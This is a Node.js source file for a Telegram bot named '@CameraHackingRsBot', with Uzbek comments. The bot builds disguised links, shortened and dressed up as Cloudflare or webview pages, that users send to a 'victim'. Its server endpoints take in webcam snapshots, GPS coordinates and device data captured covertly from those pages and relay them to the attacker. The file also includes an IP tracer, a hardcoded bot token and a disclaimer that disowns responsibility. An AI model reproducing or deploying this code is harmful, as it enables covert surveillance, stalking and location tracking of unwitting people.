const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const request = require('request');
const moment = require('moment');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot("6779437990:AAFakAal25d-frIRDKhYL8ZVW-j3dbL2tWk", {polling: true});

var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });

const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));



bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();


  fs.readFile('id.txt', 'utf8', (err, data) => {
    if (err) {
      console.error(err);

    } else {
      let userIds = data.trim().split('\n');
      let isNewUser = true;


      userIds.forEach((id, index) => {
        if (id === userId) {
          isNewUser = false;
          userIds[index] = userId; 
        }
      });


      if (isNewUser) {
        userIds.push(userId);
      }


      fs.writeFile('id.txt', userIds.join('\n'), (err) => {
        if (err) {
          console.error(err);

        } else {

        }
      });
    }
  });
});

bot.onText(/\/panel/, (msg) => {
  const chatId = 6535263665;


  const keyboard1 = [
    [{ text: '✍ sᴇɴᴅ ᴍᴇssᴀɢᴇ ᴍᴇᴍʙᴇʀs', callback_data: 'send_msg' }],
    [{ text: '📊 sᴛᴀsᴛɪᴄ ʙᴏᴛ ', callback_data: 'stat' }],
  ];

  const options = {
    reply_markup: {
      inline_keyboard: keyboard1,
    },
  };


  bot.sendMessage(chatId, '💻 ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ', options);
});

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;

  if (query.data === 'stat') {
    fs.readFile('id.txt', 'utf8', (err, data) => {
      if (err) {
        console.error(err);
        return;
      }

      const ids = data.split('\n');

      ids.forEach((id) => {

      });

      bot.sendMessage(chatId, `📊 ʙᴏᴛ sᴛᴀsᴛɪᴄ\n\n👤 ғᴏʟʟᴏᴡᴇʀs ${ids.length}`);
    });
  }

else if (query.data === 'send_msg') {
    bot.sendMessage(chatId, 'ʜᴏᴡ ᴛᴏ sᴇɴᴅ ᴍᴇssᴀɢᴇ ғᴏʀ ᴍᴇᴍʙᴇʀs ❗️\n\nᴇxᴀᴍᴘʟᴇ » /message hello every one');
  }


  bot.deleteMessage(chatId, messageId);
  bot.answerCallbackQuery(query.id);
});

bot.onText(/\/message (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const adminChatIds = [6535263665]; 
  const messageToSend = match[1]; 

  if (adminChatIds.includes(chatId)) {
    fs.readFile('id.txt', 'utf8', (readErr, data) => {
      if (readErr) {
        bot.sendMessage(chatId, 'ᴇʀᴏʀ ❗️\nɪᴍ ɴᴏᴛ ᴠɪsɪʙᴀʟᴇ ᴄʜᴀᴛ ɪᴅs ');
      } else {
        const ids = data.trim().split('\n');

        ids.forEach(id => {

          bot.sendMessage(id, messageToSend).catch((error) => {
            console.error('ᴇʀʀᴏʀ ᴀɴ ᴏᴄᴜʀᴛᴇᴅ ❗️');
          });
        });

        bot.sendMessage(chatId, 'ʏᴏᴜʀ ᴍᴇssᴀɢᴇ sᴜᴄᴄᴇsғᴜʟʟʏ sᴇɴᴅᴇᴅ ᴍᴇᴍʙᴇʀs ᴛʜᴇ ʙᴏᴛ ☑️');
      }
    });
  } else {
    bot.sendMessage(chatId, '❗️ғᴏʀ ғᴜɴᴋsɪᴏɴ ᴏɴʟʏ ᴀᴅᴍɪɴ ❗️');
  }
});

const devbot = "ʀᴀsᴜʟʙᴇᴋᴅᴇᴠ"
const bot_username = "@CameraHackingRsBot"

function ozbekistonDate() {
    const timeDifference = 5; 
    const now = moment().utcOffset(timeDifference * 60);
    return now.format('YYYY.MM.DD');
}

function ozbekistonTime() {
    const timeDifference = 5; 
    const now = moment().utcOffset(timeDifference * 60);
    return now.format('HH:mm:ss');
}

function shortDagd(url) {
    return new Promise((resolve, reject) => {
        request.post({ url: 'https://da.gd/s/', form: { url: url } }, (error, response, body) => {
            if (!error && response.statusCode === 200) {
                resolve(body.trim());
            } else {
                reject('ᴛʜᴇ ᴜʀʟ ʏᴏᴜ sᴜʙᴍɪᴛᴛᴇᴅ ᴄᴀɴɴᴏᴛ ʙᴇ sʜᴏʀᴛᴇɴᴇᴅ ᴏʀ ᴛʜᴇ ᴜʀʟ ʏᴏᴜ sᴜʙᴍɪᴛᴛᴇᴅ ᴅᴏᴇs ɴᴏᴛ ᴇxɪsᴛ❗️');
            }
        });
    });
}



bot.onText(/\/dagd (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const url = match[1];
    try {
        const shortLink = await shortDagd(url);
        bot.sendMessage(chatId, `
ᯓ sʜᴏʀᴛ ᴛʏᴘᴇ » ᴅᴀ.ɢᴅ
ᯓ ᴏʀɢɪɴᴀʟ ᴜʀʟ » ${url}
ᯓ sʜᴏʀᴛᴇɴᴇᴅ ᴜʀʟ » ${shortLink}
ᯓ ᴅᴏɴᴇ ᴅᴀᴛᴇ » ${ozbekistonDate()}
ᯓ ᴅᴏɴᴇ ᴛɪᴍᴇ » ${ozbekistonTime()}
ᯓ ᴅᴇᴠᴇʟᴏᴘᴇʀ » ${devbot}
ᯓ ʙᴏᴛ » ${bot_username}
        `);
    } catch (error) {
        bot.sendMessage(chatId, "ᴛʜᴇ ᴜʀʟ ʏᴏᴜ sᴜʙᴍɪᴛᴛᴇᴅ ᴄᴀɴɴᴏᴛ ʙᴇ sʜᴏʀᴛᴇɴᴇᴅ ᴏʀ ᴛʜᴇ ᴜʀʟ ʏᴏᴜ sᴜʙᴍɪᴛᴛᴇᴅ ᴅᴏᴇs ɴᴏᴛ ᴇxɪsᴛ❗️");
    }
});

function shortCleanuri(url) {
    return new Promise((resolve, reject) => {
        request.post({ url: 'https://cleanuri.com/api/v1/shorten', form: { url: url } }, (error, response, body) => {
            if (!error && response.statusCode === 200) {
                const data = JSON.parse(body);
                if (data.result_url) {
                    resolve(data.result_url);
                } else {
                    reject('ᴛʜᴇ ᴜʀʟ ʏᴏᴜ sᴜʙᴍɪᴛᴛᴇᴅ ᴄᴀɴɴᴏᴛ ʙᴇ sʜᴏʀᴛᴇɴᴇᴅ ᴏʀ ᴛʜᴇ ᴜʀʟ ʏᴏᴜ sᴜʙᴍɪᴛᴛᴇᴅ ᴅᴏᴇs ɴᴏᴛ ᴇxɪsᴛ❗️');
                }
            } else {
                reject('ᴛʜᴇ ᴜʀʟ ʏᴏᴜ sᴜʙᴍɪᴛᴛᴇᴅ ᴄᴀɴɴᴏᴛ ʙᴇ sʜᴏʀᴛᴇɴᴇᴅ ᴏʀ ᴛʜᴇ ᴜʀʟ ʏᴏᴜ sᴜʙᴍɪᴛᴛᴇᴅ ᴅᴏᴇs ɴᴏᴛ ᴇxɪsᴛ❗️');
            }
        });
    });
}

bot.onText(/\/cleanuri (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const url = match[1];
    try {
        const shortLink = await shortCleanuri(url);
        bot.sendMessage(chatId, `
ᯓ sʜᴏʀᴛ ᴛʏᴘᴇ » ᴄʟᴇᴀɴᴜʀɪ
ᯓ ᴏʀɢɪɴᴀʟ ᴜʀʟ » ${url}
ᯓ sʜᴏʀᴛᴇɴᴇᴅ ᴜʀʟ » ${shortLink}
ᯓ ᴅᴏɴᴇ ᴅᴀᴛᴇ » ${ozbekistonDate()}
ᯓ ᴅᴏɴᴇ ᴛɪᴍᴇ » ${ozbekistonTime()}
ᯓ ᴅᴇᴠᴇʟᴏᴘᴇʀ » ${devbot}
ᯓ ʙᴏᴛ » ${bot_username}
        `);
    } catch (error) {
        bot.sendMessage(chatId, "ᴛʜᴇ ᴜʀʟ ʏᴏᴜ sᴜʙᴍɪᴛᴛᴇᴅ ᴄᴀɴɴᴏᴛ ʙᴇ sʜᴏʀᴛᴇɴᴇᴅ ᴏʀ ᴛʜᴇ ᴜʀʟ ʏᴏᴜ sᴜʙᴍɪᴛᴛᴇᴅ ᴅᴏᴇs ɴᴏᴛ ᴇxɪsᴛ❗️");
    }
});



// Kanal IDingizni kiriting
const channelId = '@camuznews';

// /start komandasini qayta ishlash
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    try {
        // Kanalga obuna bo'lganlikni tekshirish
        const chatMember = await bot.getChatMember(channelId, userId);

        if (chatMember.status === 'member' || chatMember.status === 'administrator' || chatMember.status === 'creator') {
            // Foydalanuvchi kanalga a'zo bo'lgan
          const buttons = {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '📚 Docs / Qollanma', url: 'https://telegra.ph/camuzbot-Ishga-tushurish-05-03' },
                  { text: '👨🏻‍💻 Dasturchi', url: 'tg://user?id=6971690005' }
                ],
                [
                  { text: 'Link yaratish 🙂‍↔️', callback_data: 'crenew' }
                ]
              ]
            }
          };

          const caption = `Assalomu aleykum <b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a></b> 🍃\n\n<blockquote>Brodar bilaman siz bu bot dan foydalanib biror odamni zapal yoki topmoqchisiz bizning botdan foydalanish mutlaqo tekin lekin siz qilgan ish uchun bot dasturchisi javobgar emas ! oylab ish koring 😊</blockquote>`;

          const imageStream = "https://telegra.ph/file/7d74e188a1afe10471b1d.jpg";
          bot.sendPhoto(msg.chat.id, imageStream, { caption, parse_mode: 'HTML', reply_markup: buttons.reply_markup });
        } else {
            // Foydalanuvchi kanalga a'zo bo'lmagan
            const options = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Kanalga a\'zo bo\'lish 🔥', url: `https://t.me/${channelId.slice(1)}`}],[{ text: 'Tekshirish ♻️', url:
`https://t.me/All_In_1_Robot?start=bot`}]
                    ]
                }
            };
            await bot.sendMessage(chatId, '👀 Botdan foydalanish uchun avval kanalimizga a\'zo bo\'ling.', options);
        }
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, 'Kechirasiz, biror narsa xato ketdi.');
    }
});




const ipApiUrl = "http://ip-api.com/json";


bot.onText(/\/iptrace (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1]; 

  try {
    const response = await fetch(`${ipApiUrl}/${ip}`);

    if (response.ok) {
      const data = await response.json();
      const {
        query,
        country,
        countryCode,
        region,
        regionName,
        city,
        zip,
        lat,
        lon,
        isp,
        org,
        as,
        timezone,
      } = data;

      let message = `🗺 ɪᴘ ᴛʀᴀᴄᴇ ɪɴғᴏʀᴍᴀᴛɪᴏɴ\n\n➥ɪᴘ ᴀʀᴅʀᴇᴀs » ${query}\n`;
      message += `➥ᴄᴏᴜɴᴛʀʏ » ${country}\n`;
      message +=`➥ᴄᴘᴜɴᴛʀʏ ᴄᴏᴅᴇ » ${countryCode}\n`
      message += `➥ʀᴇɢɪᴏɴ ᴄᴏᴅᴇ » ${region}\n`;
      message +=`➥ʀᴇɢɪᴏɴ ɴᴀᴍᴇ » ${regionName}\n`
      message += `➥ᴄɪᴛʏ » ${city}\n`;
      message += `➥ᴢɪᴘ ᴄᴏᴅᴇ » ${zip}\n`;
      message += `➥ʟᴀᴛɪᴛᴜᴅᴇ »  ${lat}\n`;
      message += `➥ʟᴏɴɢɪᴛᴜᴅᴇ »  ${lon}\n`;
      message += `➥ɪsᴘ » ${isp}\n`;
      message += `➥ᴏʀɢᴀɴɪᴢᴀᴛɪᴏɴ » ${org}\n`;
      message += `➥ᴀs » ${as}\n`
      message += `➥ᴛɪᴍᴇ ᴢᴏɴᴇ » ${timezone}`;

      bot.sendMessage(chatId, message);
    } else {
      bot.sendMessage(chatId, "The IP address you sent does not exist or there was an error getting the information ❗️");
    }
  } catch (error) {
    console.error("❗️ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ » ", error);
    bot.sendMessage(chatId, "The IP address you sent does not exist or there was an error getting the information ❗️");
  }
});


var hostURL="https://bots-sem.onrender.com";

var use1pt=false;



app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/Rasulbekdev");
}



});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/Rasulbekdev");
}



});

//bot commands 

//bot.setMyCommands([{ command: 'start', description: '♻️ ʀᴇsᴛᴀʀᴛ ʙᴏᴛ »' },
//{ command: 'help', description: '👨🏻‍💻 ʜᴇʟᴘ ᴍᴇɴᴜ »' },
//{ command: 'create', description: '🌐 ᴄʀᴇᴀᴛᴇ ʟɪɴᴋ »' },{ command: 'cmd', description: '💻 ᴄᴏᴍᴀɴᴅs ᴍᴇɴᴜ »' },{ command: 'trace', description: '🗺 ɪᴘ ᴛʀᴀᴄᴇ ɪɴғᴏ »' },{ command: 'short', description: '♻️ sʜᴏʀᴛ ʟɪɴᴋ  »' },{ command: 'disc', description: '❗️ᴅɪsᴄʟᴀɪᴍᴇʀ »' },{ command: 'panel', description: '⚙ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ »' }]);


bot.on('message', async (msg) => {
const chatId = msg.chat.id;



if(msg?.reply_to_message?.text=="🌐 Website linkini yuboring ..."){
 createLink(chatId,msg.text); 
}

if (msg.text === "/staj") {
    const buttons = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '📚 Docs / Qollanma', url: 'https://telegra.ph/camuzbot-Ishga-tushurish-05-03' },
            { text: '👨🏻‍💻 Dasturchi', url: 'tg://user?id=6971690005' }
          ],
          [
            { text: 'Link yaratish 🙂‍↔️', callback_data: 'crenew' }
          ]
        ]
      }
    };

    const caption = `Assalomu aleykum <b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a></b> 🍃\n\n<blockquote>Brodar bilaman siz bu bot dan foydalanib biror odamni zapal yoki topmoqchisiz bizning botdan foydalanish mutlaqo tekin lekin siz qilgan ish uchun bot dasturchisi javobgar emas ! oylab ish koring 😊</blockquote>`;

    const imageStream = "https://telegra.ph/file/7d74e188a1afe10471b1d.jpg";
    bot.sendPhoto(msg.chat.id, imageStream, { caption, parse_mode: 'HTML', reply_markup: buttons.reply_markup });
  }

else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId,`ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ʜᴇʟᴘ ᴍᴇɴᴜ <b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a> </b> \n\nʏᴏᴜ ᴄᴀɴ ᴄʀᴇᴀᴛᴇ ᴀ ʟɪɴᴋ ᴛʜʀᴏᴜɢʜ ᴛʜɪs ʙᴏᴛ ᴀɴᴅ sᴇɴᴅ ɪᴛ ᴛᴏ ᴛʜᴇ ᴠɪᴄᴛɪᴍ, ᴄᴏɴɴᴇᴄᴛ ᴛᴏ ʜɪs ᴄᴀᴍᴇʀᴀ, ᴛᴀᴋᴇ ᴀ ᴘɪᴄᴛᴜʀᴇ ᴏғ ʜɪᴍ ᴀɴᴅ ᴄᴀᴘᴛᴜʀᴇ ʜɪs ᴄᴏɴᴛᴇɴᴛ.`,{
  parse_mode: 'HTML'
});
}

else if(msg.text=="/cmd"){
bot.sendMessage(chatId,`ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴄᴏᴍᴀɴᴅs ᴍᴇɴᴜ <b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a> </b>\n\nᯓ ᴄᴏᴍᴀɴᴅs ᴍᴇɴᴜ » /cmd « ᴘʀᴇss
ᯓ ʀᴇsᴛᴀʀᴛ ʙᴏᴛ » /start « ᴘʀᴇss
ᯓ ʜᴇʟᴘ ᴍᴇɴᴜ » /help « ᴘʀᴇss
ᯓ ᴄʀᴇᴀᴛᴇ ʟɪɴᴋ » /create « ᴘʀᴇss
ᯓ ғᴏʀ sʜᴏʀᴛ ʟɪɴᴋ » /short « ᴘʀᴇss
ᯓ ɪᴘ ᴛʀᴀᴄᴇ ɪɴғᴏ » /trace « ᴘʀᴇss\nᯓ ᴅɪsᴄʟᴀɪᴍᴇʀ » /disc « ᴘʀᴇss\n\nʏᴏᴜ ᴄᴀɴ ᴠɪᴇᴡ ᴀɴᴅ ᴜsᴇ ᴄᴏᴍᴍᴀɴᴅs ᴜsɪɴɢ ᴛʜᴇs ᴍᴇɴᴜ `,{
  parse_mode: 'HTML'
});
}

else if(msg.text=="/disc"){
bot.sendMessage(chatId,`⛔ ᴅɪsᴄʟᴀɪᴍᴇʀ ⛔\n\nᴅᴇᴀʀ <b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a> </b>, ᴡᴇ ᴡᴀʀɴ ʏᴏᴜ ᴛʜᴀᴛ ᴛʜᴇ ᴅᴇᴠᴇʟᴏᴘᴇʀ ɪs ɴᴏᴛ ʀᴇsᴘᴏɴsɪʙʟᴇ ғᴏʀ ᴡʜᴀᴛ ʏᴏᴜ ʜᴀᴠᴇ ᴅᴏɴᴇ ᴏʀ ʏᴏᴜʀ ᴀᴄᴛɪᴏɴs ❗️\n\n<b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a> </b>, ɪғ ʏᴏᴜ ᴛᴀᴋᴇ ᴘɪᴄᴛᴜʀᴇs ғʀᴏᴍ ᴛʜᴇ ᴄᴀᴍᴇʀᴀ ᴏғ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴀɴᴅ ʜᴇ ᴄᴏᴍᴘʟᴀɪɴs ᴀʙᴏᴜᴛ ʏᴏᴜ\n\nᴋᴇᴇᴘ ɪɴ ᴍɪɴᴅ ᴛʜᴀᴛ ᴛʜᴇ ᴏᴡɴᴇʀ ᴏғ ᴛʜᴇ ʙᴏᴛ ɪs ɴᴏᴛ ʀᴇsᴘᴏɴsɪʙʟᴇ ғᴏʀ ᴛʜɪs, ʏᴏᴜ ᴀʀᴇ ʀᴇsᴘᴏɴsɪʙʟᴇ ғᴏʀ ɪᴛ ʏᴏᴜʀsᴇʟғ ❗️`,{
  parse_mode: 'HTML'
});
}

else if(msg.text=="/short"){
bot.sendMessage(chatId,`ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sʜᴏʀᴛ ʟɪɴᴋ ᴍᴇɴᴜ <b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a> </b>\n\n♻️ ᴇxᴀᴍᴘʟᴇ sʜᴏʀᴛ ᴜʀʟ \n\n<code>/dagd https://example.com</code>\n<code>/cleanuri https://example.com</code>`,{
    parse_mode: 'HTML'
});
}  

else if(msg.text=="/trace"){
bot.sendMessage(chatId,`ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ɪᴘ ᴛʀᴀᴄᴇ ᴍᴇɴᴜ <b><a href='tg://user?id=${msg.chat.id}'>${msg.from.first_name}</a> </b>\n\n♻️ ғᴏʀ ᴇxᴀᴍᴘʟᴇ ɪᴘ ᴛʀᴀᴄᴇ\n\nᴇxᴀᴍᴘʟᴇ <code>/iptrace 4.4.4.4</code>\nᴇxᴀᴍᴘʟᴇ <code>/iptrace 5.5.5.5</code>`,{
  parse_mode: 'HTML'
});
}

});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
} 
});
bot.on('polling_error', (error) => {

});






async function createLink(cid,msg){

var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {

var url=cid.toString(36)+'/'+btoa(msg);
var m={
  reply_markup:JSON.stringify({
    "inline_keyboard":[[{text:"♻️ Yangi link yaratish ♻️",callback_data:"crenew"}]]
  } )
};

var cUrl=`${hostURL}/c/${url}`;
var wUrl=`${hostURL}/w/${url}`;

bot.sendChatAction(cid,"typing");
if(use1pt){
var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
var y = await fetch(`https://da.gd/s?url=${encodeURIComponent(wUrl)}`);




var f="",g="";

for(var c in x){
f+=x[c]+"\n";
}

for(var c in y){
g+=y[c]+"\n";
}




  // Bot orqali xabar yuborish

  
  
bot.sendMessage(cid, `Sizning link laringiz mufaqyatli tayorlandi 🙂‍↔️

🧐 siz yuborgan link: ${msg}

☁ Cloud flare havolasi\n➥${f}

🌐 Webview havolasi\n➥${g}\n`,m);
  }
  else{

bot.sendMessage(cid, `Sizning link laringiz mufaqyatli tayorlandi 🙂‍↔️

🧐 siz yuborgan link: ${msg}

☁ Cloud flare havolasi\n➥${cUrl}

🌐 Webview havolasi\n➥${wUrl}\n`,m);


}
}
else{
bot.sendMessage(cid,`Hato link yubordingiz 🥺\n\nIltimos qayta urinib koring 😊\n\nMisol uchun : https://google.com yoki http://google.com`);
createNew(cid);
j
}  
}


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`🌐 Website linkini yuboring ...`,mk);
}





app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});


});


app.post("/location",(req,res)=>{


var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`🗺 sᴏᴄɪᴀʟʟ ᴍᴀᴘ ʟɪɴᴋs\n🌐 ɢᴏᴏɢʟᴇ ᴍᴀᴘ ʟɪɴᴋ » https://www.google.com/maps/place/${lat}+${lon}\n🌏 ᴇᴀʀᴛʜ ᴍᴀᴘ ʟɪɴᴋ » https://earth.google.com/web/search/${lat},${lon}`);
  bot.sendMessage(parseInt(uid,36),`ᯓ ʟᴀᴛɪᴛᴜᴅᴇ » ${lat}\nᯓ ʟᴏɴɢɪᴛᴜᴅᴇ » ${lon}\nᯓ ᴀᴄᴄᴜᴀʀʏ » ${acc} ᴍ`);

res.send("Done");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null; 
if( uid != null && data != null){


data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});


res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
var uid=decodeURIComponent(req.body.uid)  || null;
var img=decodeURIComponent(req.body.img) || null;

if( uid != null && img != null){

var buffer=Buffer.from(img,'base64');

var info={
filename:"camsnap.png",
contentType: 'image/png'
};


try {
bot.sendPhoto(parseInt(uid,36),buffer,{},info);
} catch (error) {
console.log(error);
}
console.log(uid)  


res.send("Done");

}

});



app.listen(5000, () => {
console.log("App Running on Port 5000!");
});